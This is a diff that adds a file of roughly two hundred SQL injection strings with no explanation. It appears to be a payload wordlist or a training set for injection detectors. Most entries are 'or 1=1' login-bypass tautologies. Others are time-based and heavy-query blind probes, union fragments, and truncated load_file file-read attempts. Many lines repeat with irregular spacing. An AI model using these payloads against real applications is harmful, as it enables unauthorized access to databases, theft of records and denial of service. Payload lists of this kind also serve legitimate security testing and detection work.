@@ -1,0 +1,200 @@
+select * from users where id  =  1   or 1  =  1 -- 1
+ select * from users where id  =  1 or "$_" or 1  =  1 -- 1
+1'   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --
+ select * from users where id  =  1 or ";  (  " or 1  =  1 -- 1
+select * from users where id  =  1. or 1  =  1 -- 1
+select * from users where id  =  1. or 1  =  1 -- 1
+select * from users where id  =  '1' <@.$ or 1  =  1 -- 1'
+ select * from users where id  =  1 or "]{" or 1  =  1 -- 1
+select * from users where id  =  '1'   or 1  =  1 -- 1'
+ select * from users where id  =  1 or "  (    )  " or 1  =  1 -- 1
+select * from users where id  =  '1'   or 1  =  1 -- 1'
+select * from users where id  =  1.*1 or 1  =  1 -- 1
+ select * from users where id  =  1 or "$&" or 1  =  1 -- 1
+ select * from users where id  =  1 or "  (  #" or 1  =  1 -- 1
+x' and 1  =    (  select count  (  *  )   from tabname  )  , --
+select * from users where id  =  1 +$ 1 or 1  =  1 -- 1
+ select * from users where id  =  1 or "&  )  " or 1  =  1 -- 1
+admin'or 1  =  1 or ''  =  '
+select * from users where id  =  1. or 1  =  1 -- 1
+select * from users where id  =  1 + $+%1 or 1  =  1 -- 1
+ select * from users where id  =  1 or "%{" or 1  =  1 -- 1
+select * from users where id  =  1. or 1  =  1 -- 1
+select * from users where id  =  1 <@ or 1  =  1 -- 1
+select * from users where id  =  '1'   or 1  =  1 -- 1'
+ select * from users where id  =  1 or "&  )  " or 1  =  1 -- 1
+select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1
+x' and 1  =    (  select count  (  *  )   from tabname  )  , --
+select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1
+%27 or 1  =  1
+ select * from users where id  =  1 or "&  )  " or 1  =  1 -- 1
+select * from users where id  =  '1'   or 1  =  1 -- 1'
+ end and   (  "vwbx"  =  "vwbx
+select * from users where id  =  1 + \+%\ or 1  =  1 -- 1
+select * from users where id  =  1 +$+ or 1  =  1 -- 1
+select * from users where id  =  1 or \<$ or 1  =  1 -- 1
+ select * from users where id  =  1 or ",,"  =  1 or 1  =  1 -- 1
+ select * from users where id  =  1 or ",&" or 1  =  1 -- 1
+ select * from users where id  =  1 or "  (    )  " or 1  =  1 -- 1
+or 'unusual'   =   'unusual'
+select * from users where id  =  1 or \+<\ or 1  =  1 -- 1
+admin"  )   or   (  "1"  =  "1"--
+select * from users where id  =  1. or 1  =  1 -- 1
+or 1  =  1 or ""  =  
+admin' or 1  =  1--
+admin'  )   or '1'  =  '1
+ select * from users where id  =  1 or "  (  @" or 1  =  1 -- 1
+select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1
+admin' or 1  =  1--
+select * from users where id  =  1. or 1  =  1 -- 1
+ select * from users where id  =  1 or ".," or 1  =  1 -- 1
+ select * from users where id  =  1 or "?;" or 1  =  1 -- 1
+admin"  )   or   (  "1"  =  "1"--
+select * from users where id  =  1   or 1  =  1 -- 1
+ select * from users where id  =  1 or "  (  ]" or 1  =  1 -- 1
+select * from users where id  =  1 or $ 1  =  1 or 1  =  1 -- 1
+or '7659'  =  '7659
+select * from users where id  =  1 %$ . or 1  =  1 -- 1
+select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1'
+select * from users where id  =  1. or 1  =  1 -- 1
+ select * from users where id  =  1 or ";  (  " or 1  =  1 -- 1
+select * from users where id  =  1 %$ 1 or 1  =  1 -- 1
+select * from users where id  =  1 or \.<1 or 1  =  1 -- 1
+select * from users where id  =  1   or 1  =  1 -- 1
+or 'text'   =   n'text'
+select * from users where id  =  '1'   or 1  =  1 -- 1'
+admin' or 1  =  1--
+admin' or 1  =  1--
+ select * from users where id  =  1 or "?#" or 1  =  1 -- 1
+admin'  )   or   (  '1'  =  '1'#
+select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1
+select * from users where id  =  1 +$+ or 1  =  1 -- 1
+admin'  )   or '1'  =  '1'--
+select * from users where id  =  1. or 1  =  1 -- 1
+select * from users where id  =  1 +$+ or 1  =  1 -- 1
+ select * from users where id  =  1 or ";@" or 1  =  1 -- 1
+ select * from users where id  =  1 or "]{" or 1  =  1 -- 1
+ select * from users where id  =  1 or "1&" or 1  =  1 -- 1
+x' and 1  =    (  select count  (  *  )   from tabname  )  , --
+select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1'
+ select * from users where id  =  1 or "  (    )  " or 1  =  1 -- 1
+select * from users where id  =  1 or \.<\ or 1  =  1 -- 1
+admin" or 1  =  1
+select * from users where id  =  1 + \+%\ or 1  =  1 -- 1
+select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1
+or username like char  (  37  )  ,
+-7999  )   or 8422  =  1336
+select * from users where id  =  1 +$+ or 1  =  1 -- 1
+select * from users where id  =  1 <@1$ or 1  =  1 -- 1
+admin" or "1"  =  "1"--
+select * from users where id  =  1 %$ . or 1  =  1 -- 1
+select * from users where id  =  1 + $+%$ or 1  =  1 -- 1
+admin"  )   or "1"  =  "1"--
+ select * from users where id  =  1 or ";  (  " or 1  =  1 -- 1
+select * from users where id  =  1 %$ . or 1  =  1 -- 1
+select * from users where id  =  1. or 1  =  1 -- 1
+1'  )   where 6941  =  6941 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --
+admin"  )   or "1"  =  "1"--
+select * from users where id  =  1   or 1  =  1 -- 1
+%27 or 1  =  1
+ select * from users where id  =  1 or "&  )  " or 1  =  1 -- 1
+select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1
+select * from users where id  =  1   or 1  =  1 -- 1
+or username like char  (  37  )  ,
+select * from users where id  =  1 + $+%1 or 1  =  1 -- 1
+1%" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --
+ select * from users where id  =  1 or "$&" or 1  =  1 -- 1
+%27 or 1  =  1
+select * from users where id  =  1 +  (  \  )   or 1  =  1 -- 1
+select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1'
+ select * from users where id  =  1 or "  (  @" or 1  =  1 -- 1
+ select * from users where id  =  1 or ".@" or 1  =  1 -- 1
+x' and 1  =    (  select count  (  *  )   from tabname  )  , --
+x' and 1  =    (  select count  (  *  )   from tabname  )  , --
+ select * from users where id  =  1 or "{,"  =  1 or 1  =  1 -- 1
+admin"  )   or   (  "1"  =  "1"--
+? or 1  =  1 --
+admin' or 1  =  1--
+ end and   (  "vwbx"  =  "vwbx
+ select * from users where id  =  1 or ".@" or 1  =  1 -- 1
+select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1'
+ select * from users where id  =  1 or @#"  (    =  1 or 1  =  1 -- 1
+ select * from users where id  =  1 or ".," or 1  =  1 -- 1
+select * from users where id  =  1. or 1  =  1 -- 1
+select * from users where id  =  1.*1 or 1  =  1 -- 1
+ select * from users where id  =  1 or ".," or 1  =  1 -- 1
+select * from users where id  =  1 + $+%1 or 1  =  1 -- 1
+select * from users where id  =  '1' <@&1 or 1  =  1 -- 1'
+x' and 1  =    (  select count  (  *  )   from tabname  )  , --
+ select * from users where id  =  1 or "  (    )  " or 1  =  1 -- 1
+x' and 1  =    (  select count  (  *  )   from tabname  )  , --
+select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1
+ select * from users where id  =  1 or "{{" or 1  =  1 -- 1
+  )   or   (  'x'  )    =    (  'x
+admin' or 1  =  1--
+ select * from users where id  =  1 or "  )  ," or 1  =  1 -- 1
+select * from users where id  =  1 or \.<$ or 1  =  1 -- 1
+ select * from users where id  =  1 or "$_" or 1  =  1 -- 1
+select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1
+select * from users where id  =  1. or 1  =  1 -- 1
+ select * from users where id  =  1 or "%," or 1  =  1 -- 1
+ select * from users where id  =  1 or "%{" or 1  =  1 -- 1
+select * from users where id  =  1 +$+. or 1  =  1 -- 1
+admin' or 1  =  1--
+ and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...
+select * from users where id  =  1 <@ or 1  =  1 -- 1
+admin'  )   or   (  '1'  =  '1'#
+ select * from users where id  =  1 or "%1" or 1  =  1 -- 1
+-7999  )   or 8422  =  1336
+or username like char  (  37  )  ,
+ select * from users where id  =  1 or "  )  1" or 1  =  1 -- 1
+ and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...
+select * from users where id  =  '1' *  (  \  )   or 1  =  1 -- 1'
+ select * from users where id  =  1 or "  (    )  " or 1  =  1 -- 1
+admin"  )   or "1"  =  "1"/*
+ select * from users where id  =  1 or "1&" or 1  =  1 -- 1
+ select * from users where id  =  1 or ";1" or 1  =  1 -- 1
+hi or 1  =  1 --"
+ select * from users where id  =  1 or "?;" or 1  =  1 -- 1
+select * from users where id  =  1 or $ 1  =  1 or 1  =  1 -- 1
+ select * from users where id  =  1 or "\#" or 1  =  1 -- 1
+select * from users where id  =  1 or \.<\ or 1  =  1 -- 1
+select * from users where id  =  1 +  (  \  )   or 1  =  1 -- 1
+ select * from users where id  =  1 or "_  )  " or 1  =  1 -- 1
+select * from users where id  =  1. or 1  =  1 -- 1
+select * from users where id  =  1 or \.<\ or 1  =  1 -- 1
+ select * from users where id  =  1 or 1#"? or 1  =  1 -- 1
+Ã½ or 1  =  1 --
+ select * from users where id  =  1 or 1#"; or 1  =  1 -- 1
+ select * from users where id  =  1 or "_  )  " or 1  =  1 -- 1
+admin"  )   or "1"  =  "1"--
+admin"  )   or   (  "1"  =  "1"/*
+select * from users where id  =  1 +$+ or 1  =  1 -- 1
+select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1
+1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'gmil'  =  'gmil
+select * from users where id  =  1.%@ or 1  =  1 -- 1
+1'  )   as rvch where 1863  =  1863 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --
+ and 1  =  0  )   union all
+select * from users where id  =  1 or \.<\ or 1  =  1 -- 1
+ select * from users where id  =  1 or "1_" or 1  =  1 -- 1
+select * from users where id  =  1 or \.<\ or 1  =  1 -- 1
+x' and 1  =    (  select count  (  *  )   from tabname  )  , --
+ select * from users where id  =  1 or @#".  =  1 or 1  =  1 -- 1
+ select * from users where id  =  1 or "  )    (  "  =  1 or 1  =  1 -- 1
+admin' or 1  =  1#
+ select * from users where id  =  1 or "&  )  " or 1  =  1 -- 1
+admin'  )   or '1'  =  '1'#
+select * from users where id  =  '1'   or 1  =  1 -- 1'
+select * from users where id  =  1 or \.<\ or 1  =  1 -- 1
+ select * from users where id  =  1 or "%{" or 1  =  1 -- 1
+or username like char  (  37  )  ,
+admin' or 1  =  1--
+admin'or 1  =  1 or ''  =  '
+admin"  )   or "1"  =  "1"--
+admin'  )   or '1'  =  '1'--
+ select * from users where id  =  1 or "  (    )  " or 1  =  1 -- 1
+ select * from users where id  =  1 or @#";  =  1 or 1  =  1 -- 1
+select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1
+select * from users where id  =  1 or \.<\ or 1  =  1 -- 1
+ select * from users where id  =  1 or "  )  ," or 1  =  1 -- 1
+ select * from users where id  =  1 or "$&" or 1  =  1 -- 1
